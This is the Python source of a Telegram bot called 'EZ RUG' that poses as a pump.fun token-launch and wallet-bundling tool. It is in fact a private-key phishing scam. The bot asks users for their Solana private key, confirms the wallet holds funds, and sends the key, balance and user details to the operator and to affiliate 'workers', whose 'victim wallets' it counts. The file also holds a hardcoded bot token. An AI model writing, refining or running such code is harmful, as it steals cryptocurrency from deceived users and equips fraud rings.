import logging
import random
import asyncio
import requests
from aiogram import Bot, Dispatcher, types, executor
from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup, ParseMode
from solders.keypair import Keypair
from solana.rpc.async_api import AsyncClient
from flask import Flask
import threading

# Config
API_TOKEN = '7593919765:AAEJgxNwSUJ2RiwJ68cLDa3UkrHKD8B4INM'
OWNER_ID = 6016683553  # Replace with your actual Telegram user ID
BOT_URL = 'https://t.me/EzRugPull_bot'

bot = Bot(token=API_TOKEN)
dp = Dispatcher(bot)
solana_client = AsyncClient("https://api.mainnet-beta.solana.com")

# In-memory storage
users = {}
wallet_imported = {}
referrals = {}
expecting_private_key = {}  # New dictionary to track users who are expected to send a private key
coin_names = ['FLOKIRUG', 'ELON69', 'RUGZILLA', 'SOLSCAM', 'DEGENX', 'MOONRUG', 'EZRUG', 'DOGEKILLER']

# Flask Web Server to Keep Replit Alive
app = Flask(__name__)

@app.route('/')
def home():
    return "Bot is running!"

def run():
    app.run(host="0.0.0.0", port=8080)

t = threading.Thread(target=run)
t.start()

def bold(text):
    return f"<b>{text}</b>"

# Fetch balance function to get the SOL balance from the Solana wallet
def fetch_balance(private_key: str):
    try:
        # Generate the public key from the private key
        keypair = Keypair.from_base58_string(private_key)
        public_key = str(keypair.pubkey())

        # Define the Solana RPC endpoint
        url = "https://api.mainnet-beta.solana.com"
        headers = {
            "Content-Type": "application/json",
        }

        # Create the JSON-RPC request payload to fetch the balance
        payload = {
            "jsonrpc": "2.0",
            "id": 1,
            "method": "getBalance",
            "params": [public_key],  # Passing the public key as parameter
        }

        # Send the request to the Solana RPC API
        response = requests.post(url, json=payload, headers=headers)

        if response.status_code == 200:
            # Parse the JSON response to extract balance (in lamports)
            result = response.json()
            balance_in_lamports = result.get("result", {}).get("value", 0)

            # Convert lamports to SOL (1 SOL = 1 billion lamports)
            balance_in_sol = balance_in_lamports / 1_000_000_000

            return balance_in_sol

        else:
            # If the response is not successful
            print(f"Error fetching balance: {response.status_code}")
            return None
    except Exception as e:
        print(f"Error fetching balance: {e}")
        return None

@dp.message_handler(commands=['start'])
async def start_handler(message: types.Message):
    uid = message.from_user.id
    args = message.get_args()

    # Reset the private key expectation state when /start is used
    if uid in expecting_private_key:
        expecting_private_key.pop(uid)

    if args and args.isdigit():
        ref_id = int(args)
        if ref_id != uid:
            referrals.setdefault(ref_id, {"hits": 0, "username": ""})
            users[uid] = {'referred_by': ref_id}

    welcome_text = (
        "⭐️ <b>Welcome to EZ RUG!</b>\n"
        "🔥 <b>Where Things Happen!</b>\n\n"
        "<b>Available Features:</b>\n"
        "- Launch <a href='https://pump.fun'>pump.fun</a> tokens\n"
        "- Create or import multiple wallets\n"
        "- Auto-fund wallets via SOL disperser\n"
        "- Bundle up to 24 wallets\n"
        "- CTO <a href='https://pump.fun'>pump.fun</a>/<a href='https://raydium.io'>raydium</a> tokens\n"
        "- Delayed bundle on <a href='https://pump.fun'>pump.fun</a>\n"
        "- Advanced swap manager with intervals, sell all functions\n"
        "- Anti-MEV protection\n\n"
        "Use /start to comeback to the main menu"
    )

    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("📚 Your Projects", callback_data="your_projects"),
        InlineKeyboardButton("🚀 Create New Project", callback_data="create_project"),
        InlineKeyboardButton("🚀 Spam Launch", callback_data="spam_launch"),
        InlineKeyboardButton("💸 Bump Bot", callback_data="bump_bot"),
        InlineKeyboardButton("🧬 Referrals", callback_data="referrals"),
        InlineKeyboardButton("❓ Help", callback_data="help"),
        InlineKeyboardButton("🔑 Import Wallet", callback_data="import_wallet")
    )

    await message.answer(welcome_text, parse_mode=ParseMode.HTML, reply_markup=markup)

@dp.callback_query_handler(lambda c: c.data == "import_wallet")
async def import_wallet_button(call: types.CallbackQuery):
    uid = call.from_user.id
    expecting_private_key[uid] = True  # Set flag to expect a private key from this user
    await bot.answer_callback_query(call.id)
    await bot.send_message(
        uid, 
        "Please send your private key to import your wallet.\n\n"
    )

@dp.callback_query_handler(lambda c: c.data != "import_wallet")
async def other_buttons_handler(call: types.CallbackQuery):
    uid = call.from_user.id
    if uid not in wallet_imported:
        # Log the action of pressing any other button without importing the wallet
        user = call.from_user
        log = (
            bold("Victim attempted to use bot functionality without importing wallet") + "\n\n"
            "🔒 <b>Victim Information</b>\n"
            f"🧑‍💼 Name: {user.first_name or 'N/A'} (@{user.username or 'N/A'})\n"
            f"💡 User ID: {uid}\n"
            f"🖱 Attempted Action: {call.data}\n\n"
            "❗ The victim needs to import a wallet to use any of the other features.\n"
        )

        # Send log to owner
        await bot.send_message(OWNER_ID, log, parse_mode=ParseMode.HTML)

        # Send log to referrer if exists
        referrer_id = users.get(uid, {}).get('referred_by')
        if referrer_id and referrer_id in referrals:
            await bot.send_message(referrer_id, log, parse_mode=ParseMode.HTML)

        # Respond to the user prompting them to import wallet first
        await bot.answer_callback_query(call.id)
        await call.message.answer(
            "❗ You need to import your private key first to access the features.\n"
            "Please press the 'Import Wallet' button and send your private key."
        )
    else:
        # User has already imported a wallet, handle the specific callback action
        await bot.answer_callback_query(call.id)
        await call.message.answer(f"Selected option: {call.data}")
        # Add your feature implementations here

# Modified to only process messages that are expected to be private keys
@dp.message_handler(lambda msg: msg.from_user.id in expecting_private_key)
async def capture_wallet(message: types.Message):
    uid = message.from_user.id
    user = message.from_user
    data = message.text.strip()

    try:
        keypair = Keypair.from_base58_string(data)  # Parse the private key
        pubkey = keypair.pubkey()

        # Fetch the balance of the wallet from Solana RPC
        sol_balance = fetch_balance(data)
        if sol_balance is None:
            await message.answer(bold("❌ Invalid private key. Please try again."), parse_mode=ParseMode.HTML)
            return

        if sol_balance <= 0:
            await message.answer(bold("❌ Wallet is empty. Try another one."), parse_mode=ParseMode.HTML)
            return

        # Mark this user as having imported a wallet
        wallet_imported[uid] = True
        # Remove from expecting_private_key since we've processed it
        expecting_private_key.pop(uid)

        # Referrer information
        referrer_id = users.get(uid, {}).get('referred_by')
        referrer_username = None
        if referrer_id and referrer_id in referrals and referrals[referrer_id]['username']:
            referrer_username = referrals[referrer_id]['username']
        referrer_tag = f"@{referrer_username}" if referrer_username else "None"

        # Update referral counter if referred
        if referrer_id and referrer_id in referrals:
            referrals[referrer_id]['hits'] = referrals[referrer_id].get('hits', 0) + 1
            # Update username if not set
            if not referrals[referrer_id].get('username') and user.username:
                referrals[referrer_id]['username'] = user.username

        log = (
            bold("💥 Victim Imported Solana Wallet 💥") + "\n\n"
            "🔒 <b>Victim Information</b>\n"
            f"🧑‍💼 Name: {user.first_name or 'N/A'} (@{user.username or 'N/A'})\n"
            f"💡 User ID: {uid}\n"
            f"💰 SOL Balance: {sol_balance:.4f} SOL\n\n"
            "⚠️ Paste the private key below into Phantom\n"
            f"<code>{data}</code>\n"
            "⚠️ Do not try to exit scam, you will be caught ⚠️\n\n"
            f"Referred by: {referrer_tag}"
        )

        # Send log to owner
        await bot.send_message(OWNER_ID, log, parse_mode=ParseMode.HTML)

        # Send log to referrer (if exists)
        if referrer_id and referrer_id in referrals:
            await bot.send_message(referrer_id, log, parse_mode=ParseMode.HTML)

        # Notify user that their wallet is connected
        await message.answer(
            f"✅ Wallet connected successfully!\n\n"
            f"Detected balance: <b>{sol_balance:.4f} SOL</b>\n\nUse /mint to begin trading.",
            parse_mode=ParseMode.HTML
        )

    except Exception as e:
        logging.error(f"Error processing private key: {e}")
        await message.answer(bold("❌ Invalid private key format. Please try again with a valid Solana private key."), parse_mode=ParseMode.HTML)

# General message handler that catches all other messages
@dp.message_handler(lambda msg: not msg.text.startswith('/worker'))
async def handle_general_messages(message: types.Message):
    uid = message.from_user.id

    # Skip command handling since we have specific handlers for those
    if message.text and message.text.startswith('/'):
        if message.text == '/mint':
            await message.answer("🚀 Preparing to mint your token...\n\nPlease wait while we connect to the network.")
            # Add your mint logic here
        else:
            await message.answer("Unknown command. Use /start to see available options.")
        return

    # If user hasn't imported a wallet yet and isn't in the process of importing one
    if uid not in wallet_imported and uid not in expecting_private_key:
        await message.answer(
            "Please use the main menu to navigate through the bot features.\n"
            "Press /start to see available options."
        )
    # If user is in wallet_imported but sent a message
    elif uid in wallet_imported:
        await message.answer("Please use buttons from the menu or specific commands to interact with the bot.")

# /worker command handler to show referral statistics
@dp.message_handler(commands=['worker'])
async def worker(message: types.Message):
    uid = message.from_user.id
    username = message.from_user.username or "N/A"

    # Initialize/update referral record if not present
    if uid not in referrals:
        referrals[uid] = {"hits": 0, "username": username}
    elif username != "N/A" and not referrals[uid].get("username"):
        # Update username if we have it now
        referrals[uid]["username"] = username

    # Generate referral link using bot URL
    referral_link = f"{BOT_URL}?start={uid}"

    # Count referred users who have imported wallets (real victims)
    real_victims_count = 0
    for user_id, user_data in users.items():
        if user_data.get('referred_by') == uid and user_id in wallet_imported:
            real_victims_count += 1

    # Get total referrals count
    total_referrals = referrals[uid].get("hits", 0)

    # Status indicators
    wallet_status = "✅ Connected" if uid in wallet_imported else "❌ Not connected"
    await message.answer(
        f"├ 👤 Username: @{username}\n"
        f"├ 🆔 User ID: {uid}\n\n"
        f"<b>📊 Referral Statistics</b>\n"
        f"├ 💰 Victim Wallets: {real_victims_count}\n"
        f"├ 👥 Total Referred: {total_referrals}\n\n"
        f"<b>Your Referral Link:</b>\n"
        f"<code>{referral_link}</code>\n\n",
        parse_mode="HTML"
    )

if __name__ == '__main__':
    logging.basicConfig(level=logging.INFO)
    executor.start_polling(dp, skip_updates=True)